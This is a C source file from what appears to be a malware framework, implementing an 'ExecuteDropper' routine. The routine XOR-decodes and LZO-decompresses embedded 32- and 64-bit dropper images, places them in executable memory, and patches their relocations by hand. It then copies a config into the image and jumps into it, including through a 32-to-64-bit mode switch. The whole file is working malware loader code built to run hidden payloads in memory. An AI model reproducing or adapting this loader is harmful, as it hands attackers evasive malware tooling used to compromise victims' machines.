#include <fastcall.h>
#include <dropper.h>
#include <config.h>
#include <ntapi.h>
#include <lzo1.h>

#define MODULE_EXPORT(NAME, RVA) RVA, 

#pragma region x32
    #ifdef __INTELLISENSE__
        #define MODULE_BASERELOC             0
        #define MODULE_IMAGE                 0
        #define MODULE_IMAGE_COMPRESS_SIZE   0
        #define MODULE_IMAGE_DECOMPRESS_SIZE 0
        #define MODULE_IMAGE_DECOMPRESS_KEY  0
    #endif

    DWORD DropperImageExportAddress32[] = {
        #include "bin\image32.h"
    };

    BYTE DropperImageReloc32[] = { MODULE_BASERELOC };
    BYTE DropperImage32[]      = { MODULE_IMAGE     };

    enum {
        DropperImageCompressSize32   = MODULE_IMAGE_COMPRESS_SIZE,
        DropperImageDecompressSize32 = MODULE_IMAGE_DECOMPRESS_SIZE,
        DropperImageDecompressKey32  = MODULE_IMAGE_DECOMPRESS_KEY
    };

    #undef MODULE_BASERELOC
    #undef MODULE_IMAGE
    #undef MODULE_IMAGE_COMPRESS_SIZE
    #undef MODULE_IMAGE_DECOMPRESS_SIZE
    #undef MODULE_IMAGE_DECOMPRESS_KEY
#pragma endregion

#pragma region x64
    #ifdef __INTELLISENSE__
        #define MODULE_BASERELOC             0
        #define MODULE_IMAGE                 0
        #define MODULE_IMAGE_COMPRESS_SIZE   0
        #define MODULE_IMAGE_DECOMPRESS_SIZE 0
        #define MODULE_IMAGE_DECOMPRESS_KEY  0
    #endif

    DWORD DropperImageExportAddress64[] = {
        #include "bin\image64.h"
    };

    BYTE DropperImageReloc64[] = { MODULE_BASERELOC };
    BYTE DropperImage64[]      = { MODULE_IMAGE     };

    enum {
        DropperImageCompressSize64   = MODULE_IMAGE_COMPRESS_SIZE,
        DropperImageDecompressSize64 = MODULE_IMAGE_DECOMPRESS_SIZE,
        DropperImageDecompressKey64  = MODULE_IMAGE_DECOMPRESS_KEY
    };

    #undef MODULE_BASERELOC
    #undef MODULE_IMAGE
    #undef MODULE_IMAGE_COMPRESS_SIZE
    #undef MODULE_IMAGE_DECOMPRESS_SIZE
    #undef MODULE_IMAGE_DECOMPRESS_KEY
#pragma endregion

BOOL
ExecuteDropper(VOID)
{
    $DLOG1(DLG_FLT_INFO, "Injecting dropper");

    PVOID  Image;
    PVOID  ImageReloc;
    SIZE_T cbCompressed;
    SIZE_T cbDecompressed;
    BYTE   cbDecompressedKey;
    SIZE_T cbImageReloc;

#if SCFG_CORE_DROPPER_FORCE_X86 == ON
    if (FALSE) {
#else
    if (Config.Cpu.bUnderWow64) {
#endif
        Image             = &DropperImage64;
        ImageReloc        = &DropperImageReloc64;
        cbCompressed      = DropperImageCompressSize64;
        cbDecompressed    = DropperImageDecompressSize64;
        cbDecompressedKey = DropperImageDecompressKey64;
        cbImageReloc      = sizeof(DropperImageReloc64);
    } else {
        Image             = &DropperImage32;
        ImageReloc        = &DropperImageReloc32;
        cbCompressed      = DropperImageCompressSize32;
        cbDecompressed    = DropperImageDecompressSize32;
        cbDecompressedKey = DropperImageDecompressKey32;
        cbImageReloc      = sizeof(DropperImageReloc32);
    }

    PVOID Module = NULL;

    if (NT_ERROR(NtAllocateVirtualMemory(NtCurrentProcess(), &Module, 0, &cbDecompressed, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
        $DLOG1(DLG_FLT_ERROR, "NtAllocateVirtualMemory failed miserably");

        return FALSE;
    }

    $DLOG3(DLG_FLT_DEFAULT, "Address: 0x%p Compressed: %lu B Decompressed: %lu B", Module, cbCompressed, cbDecompressed);

    for (ULONG_PTR i = 0; i != cbCompressed; i++) {
        ((PBYTE)Image)[i] ^= cbDecompressedKey;
    }

    Lzo1Decompress(Image, cbCompressed, Module);

    PIMAGE_BASE_RELOCATION BaseReloc = (PVOID)ImageReloc;

    while (BaseReloc->SizeOfBlock) {
        $DLOG3(DLG_FLT_DEFAULT,  "% 8lX RVA % 8lX SizeOfBlock", BaseReloc->VirtualAddress, BaseReloc->SizeOfBlock);

        PWORD dwRelocArray = (PVOID)((ULONG_PTR)BaseReloc + sizeof(IMAGE_BASE_RELOCATION));
        ULONG NumberOfWords = (BaseReloc->SizeOfBlock  - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

        for (ULONG i = 0; i != NumberOfWords; i++) {
            DWORD dwRelocRva  = dwRelocArray[i] & 0xFFF;
            DWORD dwRelocType = dwRelocArray[i] >> 12;

            if (dwRelocType == IMAGE_REL_BASED_ABSOLUTE) {
                continue;
            }

            #if SCFG_CORE_DROPPER_FORCE_X86 == ON
                if (FALSE) {
            #else
                if (Config.Cpu.bUnderWow64) {
            #endif
                PULONG64_PTR dwPointer = (PVOID)((ULONG_PTR)Module + BaseReloc->VirtualAddress + dwRelocRva);

                $DLOG3(DLG_FLT_DEFAULT, "\t% 8X %X %016I64X -> %016I64X", dwRelocRva, dwRelocType, *dwPointer, *dwPointer + (ULONG64_PTR)Module);

                *dwPointer += (ULONG64_PTR)Module;
            } else {
                PULONG32_PTR dwPointer = (PVOID)((ULONG_PTR)Module + BaseReloc->VirtualAddress + dwRelocRva);

                $DLOG3(DLG_FLT_DEFAULT, "\t% 8X %X %08lX -> %08lX", dwRelocRva, dwRelocType, *dwPointer, *dwPointer + (ULONG32_PTR)Module);

                *dwPointer += (ULONG32_PTR)Module;
            }
        }

        ((ULONG_PTR)BaseReloc) += (NumberOfWords * 2) + sizeof(IMAGE_BASE_RELOCATION);
    }

    $DLOG1(DLG_FLT_DEFAULT, "Executing dropper");

#if SCFG_CORE_DROPPER_FORCE_X86 == ON
    if (FALSE) {
#else
    if (Config.Cpu.bUnderWow64) {
#endif
        PVOID64 Address = (PVOID64)((ULONG64_PTR)Module + DropperImageExportAddress64[1]);
        
        RtlpCopyMemoryInline((PVOID)((ULONG_PTR)Module + DropperImageExportAddress64[0]), &Config, sizeof(CONFIG));
        KiJumpLongMode(Address);
    } else{
        PVOID32 Address = (PVOID32)((ULONG32_PTR)Module + DropperImageExportAddress32[0]);

        RtlpCopyMemoryInline((PVOID)((ULONG_PTR)Module + DropperImageExportAddress32[1]), &Config, sizeof(CONFIG));

        /* the compiler generates jmp */
        __asm {
            call dword ptr [Address]
        }
    }

    {
        SIZE_T dwRegionSize = 0;

        if (NT_ERROR(NtFreeVirtualMemory(NtCurrentProcess(), &Module, &dwRegionSize, MEM_RELEASE))) {
            $DLOG3(DLG_FLT_ERROR, "Failed to free module image");
        }
    };

    $DLOG2(DLG_FLT_INFO, "Done");

    return TRUE;
}
